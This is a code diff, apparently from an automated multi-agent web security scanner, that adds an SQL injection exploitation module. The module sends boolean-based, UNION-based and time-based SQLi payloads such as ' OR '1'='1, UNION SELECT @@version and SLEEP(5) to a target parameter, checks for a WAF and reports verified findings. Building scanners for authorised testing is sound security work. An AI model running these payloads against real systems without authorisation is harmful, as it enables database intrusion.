@@ -97,6 +97,48 @@ func (s *SQLInjectionSpecialist) executeTask(cmdEvent bus.Event) {
 	// Report candidate to Reporter if found
 	s.reportCandidateIfFound(analysis)
 
+	// ============================================================================
+	// P1: Try to exploit if candidate was found
+	// ============================================================================
+	if strings.Contains(analysis, "VULNERABILITY CANDIDATE FOUND: Yes") {
+		var location, parameter string
+
+		// Extract location and parameter from analysis
+		lines := strings.Split(analysis, "\n")
+		for _, line := range lines {
+			line = strings.TrimSpace(line)
+			if strings.HasPrefix(line, "- LOCATION:") {
+				location = strings.TrimSpace(strings.TrimPrefix(line, "- LOCATION:"))
+			} else if strings.HasPrefix(line, "- VULNERABLE PARAMETER:") {
+				parameter = strings.TrimSpace(strings.TrimPrefix(line, "- VULNERABLE PARAMETER:"))
+			}
+		}
+
+		// Build target URL
+		targetURL := s.target
+		if location != "" && !strings.HasPrefix(location, "http") {
+			if strings.HasPrefix(location, "/") {
+				if parsedURL, err := url.Parse(s.target); err == nil {
+					targetURL = fmt.Sprintf("%s://%s%s", parsedURL.Scheme, parsedURL.Host, location)
+				}
+			}
+		} else if location != "" {
+			targetURL = location
+		}
+
+		// Attempt exploitation
+		if parameter != "" {
+			log.Printf("[%s] 🔥 Attempting SQLi exploitation on: %s (param: %s)\n", s.id, targetURL, parameter)
+			exploited := s.exploitSQLi(targetURL, parameter)
+
+			if !exploited {
+				log.Printf("[%s] ⚠️ SQLi exploitation failed - false positive?\n", s.id)
+			}
+		} else {
+			log.Printf("[%s] ⚠️ No parameter specified, skipping exploitation\n", s.id)
+		}
+	}
+
 	// Generate report
 	report := s.generateReport(httpOutput, analysis)
 
@@ -225,4 +267,262 @@ func (s *SQLInjectionSpecialist) reportError(toAgent string, err error) {
 		Payload:   err.Error(),
 	}
 	s.bus.Publish(toAgent, event)
+}
+
+// ============================================================================
+// SQLi Exploitation Functions (P1 Implementation)
+// ============================================================================
+
+// measureResponseTime measures the HTTP response time for a given URL
+func (s *SQLInjectionSpecialist) measureResponseTime(targetURL string) (time.Duration, error) {
+	// Create a context with timeout
+	ctx, cancel := context.WithTimeout(s.ctx, 10*time.Second)
+	defer cancel()
+
+	startTime := time.Now()
+	_, err := tools.SimpleHTTPGet(ctx, s.executor, targetURL)
+	elapsed := time.Since(startTime)
+
+	if err != nil {
+		// Check if error is due to timeout
+		if ctx.Err() == context.DeadlineExceeded {
+			return elapsed, fmt.Errorf("request timeout after %v", elapsed)
+		}
+		return elapsed, err
+	}
+
+	return elapsed, nil
+}
+
+// buildSQLiURL constructs a URL with SQLi payload injected into the parameter
+func (s *SQLInjectionSpecialist) buildSQLiURL(baseURL string, parameter string, payload string) string {
+	// Parse the base URL
+	parsedURL, err := url.Parse(baseURL)
+	if err != nil {
+		log.Printf("[%s] Failed to parse URL: %v\n", s.id, err)
+		return baseURL
+	}
+
+	// Get existing query parameters
+	queryParams := parsedURL.Query()
+
+	// Inject payload into the parameter
+	queryParams.Set(parameter, payload)
+
+	// Update the URL with new query parameters
+	parsedURL.RawQuery = queryParams.Encode()
+
+	return parsedURL.String()
+}
+
+// verifyBooleanBased tests for Boolean-based Blind SQLi
+// Returns (success, payload) if vulnerability is confirmed
+func (s *SQLInjectionSpecialist) verifyBooleanBased(targetURL string, parameter string) (bool, string) {
+	log.Printf("[%s] Testing Boolean-based Blind SQLi...\n", s.id)
+
+	// True condition payload
+	truePayload := "' OR '1'='1"
+	trueURL := s.buildSQLiURL(targetURL, parameter, truePayload)
+	trueURL = s.replaceLocalhostForDocker(trueURL)
+
+	// False condition payload
+	falsePayload := "' OR '1'='2"
+	falseURL := s.buildSQLiURL(targetURL, parameter, falsePayload)
+	falseURL = s.replaceLocalhostForDocker(falseURL)
+
+	// Fetch response for true condition
+	trueResponse, err := tools.SimpleHTTPGet(s.ctx, s.executor, trueURL)
+	if err != nil {
+		log.Printf("[%s] True condition request failed: %v\n", s.id, err)
+		return false, ""
+	}
+
+	// Fetch response for false condition
+	falseResponse, err := tools.SimpleHTTPGet(s.ctx, s.executor, falseURL)
+	if err != nil {
+		log.Printf("[%s] False condition request failed: %v\n", s.id, err)
+		return false, ""
+	}
+
+	// Check for WAF
+	if strings.Contains(trueResponse, "403 Forbidden") || strings.Contains(trueResponse, "ModSecurity") {
+		log.Printf("[%s] WAF detected, aborting exploitation\n", s.id)
+		return false, ""
+	}
+
+	// Compare response lengths (20% difference threshold)
+	truLen := len(trueResponse)
+	falseLen := len(falseResponse)
+
+	diff := float64(truLen - falseLen)
+	if falseLen > 0 {
+		diffPercent := (diff / float64(falseLen)) * 100
+		if diffPercent < 0 {
+			diffPercent = -diffPercent
+		}
+
+		log.Printf("[%s] Response length diff: %.2f%% (true: %d, false: %d)\n", s.id, diffPercent, truLen, falseLen)
+
+		if diffPercent >= 20.0 {
+			log.Printf("[%s] ✅ Boolean-based SQLi confirmed!\n", s.id)
+			return true, truePayload
+		}
+	}
+
+	return false, ""
+}
+
+// verifyUnionBased tests for UNION-based SQLi
+// Returns (success, payload) if vulnerability is confirmed
+func (s *SQLInjectionSpecialist) verifyUnionBased(targetURL string, parameter string) (bool, string) {
+	log.Printf("[%s] Testing UNION-based SQLi...\n", s.id)
+
+	// UNION SELECT payloads
+	payloads := []string{
+		"' UNION SELECT NULL,@@version-- -",
+		"' UNION SELECT NULL,database()-- -",
+		"' UNION SELECT NULL,version()-- -",
+		"1' UNION SELECT NULL,@@version-- -",
+	}
+
+	for _, payload := range payloads {
+		testURL := s.buildSQLiURL(targetURL, parameter, payload)
+		testURL = s.replaceLocalhostForDocker(testURL)
+
+		response, err := tools.SimpleHTTPGet(s.ctx, s.executor, testURL)
+		if err != nil {
+			log.Printf("[%s] UNION payload request failed: %v\n", s.id, err)
+			continue
+		}
+
+		// Check for WAF
+		if strings.Contains(response, "403 Forbidden") || strings.Contains(response, "ModSecurity") {
+			log.Printf("[%s] WAF detected, aborting exploitation\n", s.id)
+			return false, ""
+		}
+
+		// Check for database version indicators
+		lowerResponse := strings.ToLower(response)
+		if strings.Contains(lowerResponse, "mysql") ||
+			strings.Contains(lowerResponse, "mariadb") ||
+			strings.Contains(lowerResponse, "postgresql") ||
+			strings.Contains(lowerResponse, "sqlite") ||
+			strings.Contains(lowerResponse, "oracle") ||
+			strings.Contains(lowerResponse, "mssql") ||
+			strings.Contains(response, "5.") || // MySQL version pattern
+			strings.Contains(response, "10.") { // MariaDB version pattern
+
+			log.Printf("[%s] ✅ UNION-based SQLi confirmed! DB info found in response\n", s.id)
+			return true, payload
+		}
+	}
+
+	return false, ""
+}
+
+// verifyTimeBased tests for Time-based Blind SQLi
+// Returns (success, payload) if vulnerability is confirmed
+func (s *SQLInjectionSpecialist) verifyTimeBased(targetURL string, parameter string) (bool, string) {
+	log.Printf("[%s] Testing Time-based Blind SQLi...\n", s.id)
+
+	// Measure baseline response time
+	baselineURL := s.replaceLocalhostForDocker(targetURL)
+	baselineTime, err := s.measureResponseTime(baselineURL)
+	if err != nil {
+		log.Printf("[%s] Baseline measurement failed: %v\n", s.id, err)
+		return false, ""
+	}
+
+	log.Printf("[%s] Baseline response time: %.2fs\n", s.id, baselineTime.Seconds())
+
+	// Time-based payloads (5 second delay)
+	payloads := []string{
+		"' AND SLEEP(5)-- -",
+		"' OR SLEEP(5)-- -",
+		"1' AND SLEEP(5)-- -",
+		"' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)-- -",
+	}
+
+	for _, payload := range payloads {
+		testURL := s.buildSQLiURL(targetURL, parameter, payload)
+		testURL = s.replaceLocalhostForDocker(testURL)
+
+		sleepTime, err := s.measureResponseTime(testURL)
+
+		// Check if timeout occurred (likely SQLi success)
+		if err != nil && strings.Contains(err.Error(), "timeout") {
+			log.Printf("[%s] ✅ Time-based SQLi confirmed! Request timed out (SLEEP worked)\n", s.id)
+			return true, payload
+		}
+
+		if err != nil {
+			log.Printf("[%s] Time-based payload failed: %v\n", s.id, err)
+			continue
+		}
+
+		log.Printf("[%s] SLEEP payload response time: %.2fs\n", s.id, sleepTime.Seconds())
+
+		// Check if response time increased by at least 4.5 seconds
+		timeDiff := sleepTime.Seconds() - baselineTime.Seconds()
+		if timeDiff >= 4.5 {
+			log.Printf("[%s] ✅ Time-based SQLi confirmed! Time increased by %.2fs\n", s.id, timeDiff)
+			return true, payload
+		}
+	}
+
+	return false, ""
+}
+
+// reportVerifiedSQLi publishes a Finding event to Reporter
+func (s *SQLInjectionSpecialist) reportVerifiedSQLi(vulnType string, targetURL string, payload string, evidence string) {
+	finding := map[string]interface{}{
+		"type":        vulnType,
+		"url":         targetURL,
+		"payload":     payload,
+		"severity":    "High",
+		"description": fmt.Sprintf("Verified %s vulnerability. \nEvidence: %s", vulnType, evidence),
+		"timestamp":   time.Now().Format(time.RFC1123),
+	}
+
+	msgID := sqliMessageCounter.Add(1)
+	event := bus.Event{
+		ID:        fmt.Sprintf("%s-finding-%d", s.id, msgID),
+		FromAgent: s.id,
+		ToAgent:   "BROADCAST",
+		Type:      bus.Finding,
+		Payload:   finding,
+	}
+	s.bus.Publish("Reporter-01", event)
+
+	log.Printf("[%s] ✅ Verified SQLi: %s at %s\n", s.id, vulnType, targetURL)
+}
+
+// exploitSQLi attempts to exploit SQLi vulnerability using multiple techniques
+// Returns true if any technique succeeds
+func (s *SQLInjectionSpecialist) exploitSQLi(targetURL string, parameter string) bool {
+	// Try Boolean-based first (fastest)
+	success, payload := s.verifyBooleanBased(targetURL, parameter)
+	if success {
+		evidence := fmt.Sprintf("Boolean-based Blind SQLi confirmed with payload: %s", payload)
+		s.reportVerifiedSQLi("SQLi-BooleanBased", targetURL, payload, evidence)
+		return true
+	}
+
+	// Try UNION-based (data extraction)
+	success, payload = s.verifyUnionBased(targetURL, parameter)
+	if success {
+		evidence := fmt.Sprintf("UNION-based SQLi confirmed with payload: %s", payload)
+		s.reportVerifiedSQLi("SQLi-UnionBased", targetURL, payload, evidence)
+		return true
+	}
+
+	// Try Time-based (slowest but most reliable)
+	success, payload = s.verifyTimeBased(targetURL, parameter)
+	if success {
+		evidence := fmt.Sprintf("Time-based Blind SQLi confirmed with payload: %s", payload)
+		s.reportVerifiedSQLi("SQLi-TimeBased", targetURL, payload, evidence)
+		return true
+	}
+
+	return false
 }
